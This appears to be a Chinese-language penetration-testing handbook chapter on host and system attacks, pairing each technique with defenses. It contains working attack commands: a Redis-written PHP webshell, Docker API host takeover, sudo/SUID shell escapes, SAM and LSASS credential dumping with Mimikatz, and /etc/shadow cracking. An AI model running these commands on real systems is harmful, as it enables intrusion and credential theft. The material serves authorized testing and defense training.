# 主机与系统渗透(Host & System Penetration Testing)

> 关键词:主机渗透, 系统渗透, 服务漏洞利用, 弱口令, 暴力破解, 未授权访问, Redis, MongoDB, Docker API, SMB, 永恒之蓝, Linux提权, Windows提权, SUID, 密码抓取, SAM, LSASS, Mimikatz

## 概述

主机与系统渗透聚焦**服务器操作系统的攻击与防御**:从服务漏洞利用、弱口令到未授权访问,再到获得初始权限后的**提权**与**凭据抓取**。本章按攻击链组织,每节附防御视角。

> ⚠️ **仅限授权测试**:爆破、漏洞利用会产生大量日志与流量,须在授权范围内进行;涉及凭据抓取与提权的内容仅用于授权的渗透测试与防御研究,严禁用于非法用途。

## 服务漏洞利用

服务漏洞利用的前提是**精确的版本识别**(见《信息收集.md》),然后匹配已知 CVE 与 PoC。

```bash
# 版本识别(nmap)
nmap -sV -p 22,80,443,445,3306,6379,8080 target.com
# 匹配漏洞
searchsploit openssh 7.2
searchsploit apache 2.4.49
nuclei -u target.com -t cves/ -severity critical -silent
```

**典型高危服务漏洞举例**(版本对应关系):

| 服务 | 漏洞示例 | 影响 |
| --- | --- | --- |
| OpenSSH | CVE-2024-6387(regreSSHion) | 特定版本可导致 RCE(需精确版本与架构) |
| Apache | CVE-2021-41773/42013 | 路径穿越 + RCE |
| SMBv1 | MS17-010(永恒之蓝) | 远程代码执行,内网横向利器 |
| Log4j | CVE-2021-44228(Log4Shell) | Java 应用 RCE(见《Web渗透测试.md》反序列化节) |
| Nginx | 解析漏洞(旧版) | 文件上传后 RCE |
| ProFTPD | mod_copy(CVE-2015-3306) | 未授权文件复制 |

**验证原则**:先无害验证(版本、报错、回连),再在授权环境完成利用证明;利用工具(Metasploit)仅用于授权靶场。

## 弱口令与暴力破解

弱口令仍是主机失陷的首要原因。爆破工具与思路:

```bash
# Hydra 爆破 SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com -t 4 -f
# Hydra 爆破 RDP / SMB / FTP
hydra -L users.txt -P pass.txt rdp://target.com
hydra -L users.txt -P pass.txt smb://target.com
hydra -L users.txt -P pass.txt ftp://target.com
# Medusa(多协议)
medusa -h target.com -U users.txt -P pass.txt -M ssh
# 在线服务爆破要限速,避免触发锁定与告警
# 字典推荐:rockyou.txt、SecLists/Passwords、组织名+年份组合(公司名2024! 等)
```

**判断标准**:
- 爆破前先确认服务**无锁定策略**(尝试错误 5 次后仍可继续登录)。
- 观察响应时间差与错误消息差异,过滤有效账号。
- 优先组合:已知用户名(来自信息收集)+ 默认口令(admin/admin、root/toor、设备默认口令表)。

**防御**:强密码策略 + 密码复杂度校验、登录失败锁定与限速、SSH 密钥登录、双因素认证、基于 IP 的访问控制、爆破行为告警。

## 未授权访问

未授权访问指服务**无认证或默认空口令**即可直接操作,常见于内网与配置疏漏:

### Redis(6379)

```bash
# 未授权检测
redis-cli -h target.com -p 6379 info | head -5
# 或 nc 探测
echo -e "info\r\nquit" | nc -nv target.com 6379
# 未授权利用方向(仅授权环境):
# 1) 写 WebShell:config set dir /var/www/html; config set dbfilename shell.php;
#    set x "<?php @eval($_POST['x']);?>"; save
# 2) 写 SSH 公钥:dir /root/.ssh/; set x "公钥内容"; save
# 3) 写 crontab(需 root 运行 redis)
# 4) 主从复制 RCE(Redis 4.x-5.x,配合工具如 redis-rogue-server)
```

**防御**:绑定内网 IP + `protected-mode yes` + 设置强密码(`requirepass`)+ 防火墙限制 6379;高危环境禁用危险命令(`rename-command CONFIG ""`)。

### MongoDB(27017)

```bash
# 未授权检测
mongo "mongodb://target.com:27017" --eval "db.adminCommand('listDatabases')"
# 返回数据库列表 = 未授权
# 注意:MongoDB 3.0+ 默认 localhost 绑定,暴露面通常在配置错误环境
```

**防御**:启用认证(`--auth`)、绑定内网、防火墙限制;敏感库加密。

### Docker API(2375/2376)

```bash
# 未授权 Docker API 检测(常为内网或云上配置错误)
curl -s http://target.com:2375/version
# 可利用(仅授权):创建容器挂载宿主机根目录
# docker -H tcp://target.com:2375 ps
# 创建特权容器 → 挂载 / → 写 SSH 公钥或 crontab 获取宿主机权限
```

**防御**:Docker API 仅监听本地 socket(`/var/run/docker.sock`);远程访问用 TLS 双向认证;2375 端口禁止公网暴露。

### Rsync(873)

```bash
# 未授权列表
rsync rsync://target.com:873/
# 未授权下载(模块无认证时)
rsync -av rsync://target.com:873/模块名/ /tmp/down/
# 可写模块则可上传文件(如写 crontab/公钥)
rsync -av shell.txt rsync://target.com:873/模块名/
```

**防御**:rsync 模块配置 `auth users` + `secrets file`;`read only = yes` 除非必要;仅限内网访问。

### 其他常见未授权服务

| 服务 | 端口 | 检测命令 |
| --- | --- | --- |
| Elasticsearch | 9200 | `curl http://target.com:9200/_cat/indices` |
| Jenkins | 8080 | 访问首页看是否可无认证执行脚本 |
| ZooKeeper | 2181 | `echo envi \| nc target.com 2181` |
| Kafka | 9092 | 无认证可读写 topic |
| CouchDB | 5984 | `curl http://target.com:5984/_all_dbs` |
| Memcached | 11211 | `printf "stats\r\n" \| nc target.com 11211` |
| VNC | 5900 | 空口令直接连接 |

## Windows SMB / 445 与永恒之蓝

SMB(445)是 Windows 内网最核心的攻击面。

```bash
# SMB 信息收集
nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users target.com
# 空会话/匿名枚举(旧系统)
smbclient -L //target.com -N
# 共享访问
smbclient //target.com/share -U user
# 弱口令爆破
hydra -L users.txt -P pass.txt smb://target.com
# 永恒之蓝(MS17-010)检测
nmap -p 445 --script smb-vuln-ms17-010 target.com
# 利用需授权环境(Metasploit: exploit/windows/smb/ms17_010_eternalblue)
# 该漏洞利用可能蓝屏,严禁在生产环境直接验证,优先用检测脚本
```

**防御**:禁用 SMBv1(注册表/组策略)、及时打补丁、445 端口不出公网、内网分段、EDR 检测 EternalBlue 利用行为。

## Linux 提权

获得低权限 shell 后,提权是扩大战果的关键。**提权前先收集系统信息**:

```bash
# 系统与内核
uname -a; cat /etc/os-release; cat /etc/issue
# 当前用户与权限
id; sudo -l; cat /etc/passwd | grep -E "sh$|bash$"
# 网络与进程
ss -tlnp; ps aux | grep -iE "root|tomcat|mysql"
# 定时任务
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
# 自动化提权枚举工具(授权环境)
# LinPEAS: ./linpeas.sh
# linux-exploit-suggester: ./linux-exploit-suggester.sh
```

### 常见提权向量与验证

| 向量 | 原理 | 检测/验证命令 | 修复 |
| --- | --- | --- | --- |
| SUID 提权 | 设置了 setuid 的可执行文件以属主权限运行 | `find / -perm -4000 -type f 2>/dev/null`;检查是否可利用(GTFOBins) | 移除多余 SUID,如 `chmod -s /usr/bin/xx` |
| sudo 配置错误 | `/etc/sudoers` 允许普通用户无密码执行特权命令 | `sudo -l`;若允许 `sudo find / -exec /bin/sh \;` 等可提权 | 最小化 sudo 授权,禁用危险命令 |
| 内核漏洞 | 内核版本存在公开提权 CVE | `uname -a` → searchsploit/exploit-db 匹配;利用需授权靶场 | 及时打内核补丁 |
| 可写文件 | 属主为 root 但普通用户可写的脚本/服务 | `find / -writable -type f 2>/dev/null`;检查 cron/服务调用 | 收紧文件权限,服务以非特权用户运行 |
| 环境变量劫持 | 脚本以相对路径调用命令,攻击者篡改 PATH | 查看脚本内容,若 `cp`/`tar` 无绝对路径 → 构造同名恶意程序放入 PATH | 脚本使用绝对路径,`export PATH` 白名单 |
| cron 任务 | root 定时任务执行可写脚本或使用可控命令 | `cat /etc/crontab` + 检查脚本权限 | 脚本目录收紧权限,任务最小化 |
| 弱口令 root | root 口令弱 | 用获取的密码字典尝试 `su root` | 强密码 + 禁止 root 远程登录 |

```bash
# 具体验证示例:SUID 提权(GTFOBins 中 find 示例,仅授权靶场)
find / -perm -4000 2>/dev/null
# 若 /usr/bin/find 有 SUID,可执行:
# find / -exec whoami \;   → 若输出 root,则可提权
# sudo 错误示例:sudo -l 显示 (ALL) NOPASSWD: /usr/bin/find
# sudo find / -exec /bin/bash -p \;
```

**GTFOBins / LOLBAS**:`gtfobins.github.io`(Linux 提权命令表)、`lolbas-project.github.io`(Windows)。提权枚举优先跑 linpeas,结果按「可写 + root 调用」交叉验证。

## Windows 提权

### 提权前信息收集

```cmd
:: 系统信息
systeminfo
whoami /all
net user %username%
:: 补丁与软件
wmic qfe list brief | findstr /i "KB"
wmic product get name,version
:: 网络与共享
netstat -ano
net share
:: 服务与计划任务
sc query type=service state=all
schtasks /query /fo LIST /v
:: 自动化工具:winPEAS.exe / PowerUp.ps1 / Seatbelt
```

### 常见提权向量

| 向量 | 原理 | 检测 | 修复 |
| --- | --- | --- | --- |
| 服务权限错误 | 服务以 SYSTEM 运行但二进制可写/可替换 | `accesschk`/winPEAS 枚举服务路径权限 | 服务二进制目录收紧 ACL |
| 服务路径空格 | 路径含空格未加引号,可劫持执行 | `wmic service get name,pathname` 查未引号路径 | 路径加引号 |
| 未引号服务路径 | 同上变体 | 检测服务启动二进制路径 | 加引号 + 目录权限 |
| 令牌窃取 | 有 SeImpersonatePrivilege 权限 → potato 系列提权 | `whoami /priv` 看特权 | 移除多余特权 |
| UAC 绕过 | 管理员组但 UAC 限制 | 利用白名单程序提权(需本地交互) | 开启 UAC 最高级别 |
| 内核漏洞 | 补丁缺失 | `systeminfo` + windows-exploit-suggester / Watson | 及时打补丁 |
| 可写计划任务 | 任务以 SYSTEM 运行且可写 | `schtasks /query` 检查任务路径权限 | 任务目录权限收紧 |
| 注册表自启动 | 用户可写 `HKCU\...\Run` 等键 | 检查 autorun 键 ACL | 审计自启动项 |

```cmd
:: 特权检查示例
whoami /priv
:: SeImpersonatePrivilege = Enabled 时可尝试 potato 提权(仅授权环境)
:: 未引号服务路径检测
wmic service get name,displayname,pathname,startmode | findstr /v /i "c:\windows"
```

**防御**:最小权限运行服务、服务目录 ACL 收紧、及时打补丁、启用 UAC、关闭不必要的 SeImpersonate 等特权、部署 EDR 检测提权行为(如 potato、token 操作)。

## 密码抓取与凭据

### Windows:SAM / LSASS / 浏览器凭据

```cmd
# SAM(本地账号密码哈希,需 SYSTEM 权限)
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# 离线破解:samdump2 / secretsdump / hashcat
# secretsdump -sam sam.hive -system system.hive LOCAL

# LSASS(内存中的登录凭据)
# 授权环境:procdump -ma lsass.exe lsass.dmp
# 或 Mimikatz(需管理员/系统权限)
# mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# 离线解析:dmp 文件用 mimikatz "sekurlsa::minidump lsass.dmp" 分析

# 浏览器保存的密码
# Chrome: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# 使用工具:LaZagne、BrowserPasswordDump(仅授权测试)

# 网络凭据/缓存
cmdkey /list
# DPAPI 凭据:凭据管理器(control /name Microsoft.CredentialManager)
```

**防御**:启用 **Credential Guard**(隔离 LSASS)、限制 SeDebugPrivilege、防病毒/EDR 监控 mimikatz 特征(如 `sekurlsa` 调用)、最小管理员数量、定期轮换密码、禁用明文密码存储(WDigest)。

### Linux:/etc/shadow 与历史命令

```bash
# shadow 文件(仅 root 可读)
cat /etc/shadow
# 提取哈希用 john 破解(仅授权环境)
unshadow /etc/passwd /etc/shadow > hash.txt && john hash.txt --wordlist=rockyou.txt
# 历史命令泄露的密码
cat ~/.bash_history | grep -iE "pass|ssh|mysql|ftp"
# 配置文件中的明文凭据
grep -rniE "password|passwd|pwd" /etc/ 2>/dev/null | grep -v "#"
# 环境变量
env | grep -iE "pass|key|token"
# SSH 私钥(无口令的私钥 = 直接通行证)
find / -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

**防御**:限制 root 直接登录、`/etc/shadow` 权限 640、避免命令历史含密码(可用 `HISTCONTROL=ignorespace`)、配置文件密码入库加密、SSH 私钥加密并限权限 600、最小权限运行服务。

## 综合防御视角

1. **攻击面收敛**:关闭无用服务与端口,高危端口(445/2375/6379 等)不出公网。
2. **认证强化**:强密码 + 多因素 + 锁定策略 + SSH 密钥,杜绝默认口令。
3. **补丁管理**:建立补丁基线,重点跟进 KEV/CISA 在野利用漏洞。
4. **权限最小化**:服务账号最小权限、删除 SUID、收紧 sudo、关闭高特权用户会话。
5. **凭据保护**:Credential Guard、禁止明文存储、凭据定期轮换。
6. **检测响应**:EDR/蜜罐监控提权与凭据抓取行为;登录异常(时间/来源)告警。
7. **内网隔离**:主机微隔离、按业务分段,阻断横向扩散(见《内网渗透.md》)。
